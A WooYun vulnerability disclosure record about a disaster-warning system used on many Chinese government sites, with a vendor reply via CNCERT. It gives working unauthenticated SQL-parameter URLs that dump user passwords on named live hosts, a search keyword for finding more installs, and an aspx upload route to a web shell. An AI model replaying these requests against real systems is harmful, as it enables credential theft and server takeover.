{"id": 39068, "wybug_id": "wooyun-2015-094844", "wybug_title": "某通用型灾害预警系统越权及设计缺陷致使大量政府网站沦陷", "wybug_corp": "福建四创", "wybug_author": "BMa", "wybug_date": "2015-02-23 10:09", "wybug_open_date": "2015-05-31 11:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-31：\t细节向公众公开  简要描述： 某通用型灾害预警系统越权及设计缺陷致使大量政府网站沦陷管理审核时麻烦注意与其他的不同，我在乌云上没有找到类似的漏洞 详细说明：  应用官网：http://www.strongsoft.net/关键字：intitle:预警 系统 技术支持:福建四创部分举例：\nshzh.wlfx.gov.cn/218.86.6.48:3505/yj.yywater.gov.cn/222.216.218.28:8088/219.159.102.99:8088/218.86.96.98:3505/111.12.51.221:8088/222.242.107.62:4000/fxb.lucheng.gov.cn/183.233.205.85:9001/222.83.214.58:8088/180.130.175.138:3503/hzh.wlfx.gov.cn shzh.dqwater.gov.cn218.86.6.48:3505219.159.239.96:8088/\n先说说越权：以http://219.159.239.96:8088/为例，在后台测试中发现如下操作无需登录即可进行：\nhttp://219.159.239.96:8088/TableDataManage/AjaxHandle/AjaxBaseInfoQuery.ashx?filter=and DeptID!=1&orderby=&tabnm=Web_SystemUser&pk=UserID&pkCollections=UserID,varchar&columns=UserID,UserName,UserPhone,ltrim(rtrim(UserStatus))|','|isnull((select top 1 Enuname from L03_ennuvaldep where enuval =convert(varchar(50),UserStatus)  and enucd='User_Status'),'') as UserStatus,convert(varchar,CreateTime, 120)  as CreateTime,ltrim(rtrim(DeptID))|','|isnull((select top 1 ltrim(rtrim(RoleName)) from Web_SystemUserRole where 1=1  and RoleID=Web_SystemUser.DeptID  ),'') as DeptID,1,ltrim(rtrim(RoleID))|','|isnull((select top 1 ltrim(rtrim(RoleName)) from L04_Role where 1=1  and RoleId=Web_SystemUser.RoleID  ),'') as RoleID,1,ltrim(rtrim(ADCD))|','|isnull((select top 1 ltrim(rtrim(ADNM)) from StrongWater.dbo.AD_Info_B where 1=1  and ADCD=Web_SystemUser.ADCD  ),'') as ADCD,1&_=1422623883495\n\n\n观察语句，发现这就是一条内置的sql，这是一处设计缺陷，可以用来构造新的查询：\nhttp://219.159.239.96:8088/TableDataManage/AjaxHandle/AjaxBaseInfoQuery.ashx?filter=and DeptID!=1&orderby=&tabnm=Web_SystemUser&pk=UserID&pkCollections=UserPwd,varchar&columns=UserID,UserName,UserPhone,UserPwd,null,null,null,null,null,1&_=1422623883495\n得到用户名密码：\n\n\n\n后台getshell在：基础信息查询-行政信息基本情况-预案管理，可以直接上传aspx文件，返回路径问题URL:\n/TableDataManage/AjaxHandle/AjaxBaseInfoQuery.ashx?filter=and DeptID!=1&orderby=&tabnm=Web_SystemUser&pk=UserID&pkCollections=UserPwd,varchar&columns=UserID,UserName,UserPhone,UserPwd,null,null,null,null,null,1&_=1422623883495\n其他例子：第一个：\nhttp://222.216.218.28:8088/TableDataManage/AjaxHandle/AjaxBaseInfoQuery.ashx?filter=and DeptID!=1&orderby=&tabnm=Web_SystemUser&pk=UserID&pkCollections=UserPwd,varchar&columns=UserID,UserName,UserPhone,UserPwd,null,null,null,null,null,1&_=1422623883495\n\n\n第二个：\nhttp://219.159.102.99:8088/TableDataManage/AjaxHandle/AjaxBaseInfoQuery.ashx?filter=and DeptID!=1&orderby=&tabnm=Web_SystemUser&pk=UserID&pkCollections=UserPwd,varchar&columns=UserID,UserName,UserPhone,UserPwd,null,null,null,null,null,1&_=1422623883495\n\n\n第三个：\nhttp://111.12.51.221:8088/TableDataManage/AjaxHandle/AjaxBaseInfoQuery.ashx?filter=and DeptID!=1&orderby=&tabnm=Web_SystemUser&pk=UserID&pkCollections=UserPwd,varchar&columns=UserID,UserName,UserPhone,UserPwd,null,null,null,null,null,1&_=1422623883495\n\n\n第四个：\nhttp://183.233.205.85:9001/TableDataManage/AjaxHandle/AjaxBaseInfoQuery.ashx?filter=and DeptID!=1&orderby=&tabnm=Web_SystemUser&pk=UserID&pkCollections=UserPwd,varchar&columns=UserID,UserName,UserPhone,UserPwd,null,null,null,null,null,1&_=1422623883495\n\n\n第五个：\nshzh.dqwater.gov.cn/TableDataManage/AjaxHandle/AjaxBaseInfoQuery.ashx?filter=and DeptID!=1&orderby=&tabnm=Web_SystemUser&pk=UserID&pkCollections=UserPwd,varchar&columns=UserID,UserName,UserPhone,UserPwd,null,null,null,null,null,1&_=1422623883495\n\n\n第六个：\nhttp://yj.yywater.gov.cn//TableDataManage/AjaxHandle/AjaxBaseInfoQuery.ashx?filter=and DeptID!=1&orderby=&tabnm=Web_SystemUser&pk=UserID&pkCollections=UserPwd,varchar&columns=UserID,UserName,UserPhone,UserPwd,null,null,null,null,null,1&_=1422623883495\n\n\n其他的就不举例了   漏洞证明：  其实这里应该是可以构造注入的不尝试了！   修复方案：     版权声明：转载请注明来源 BMa@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-03-02 11:22 厂商回复： CNVD确认所述漏洞情况，已经转由CNCERT下发给福建分中心，由福建分中心后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}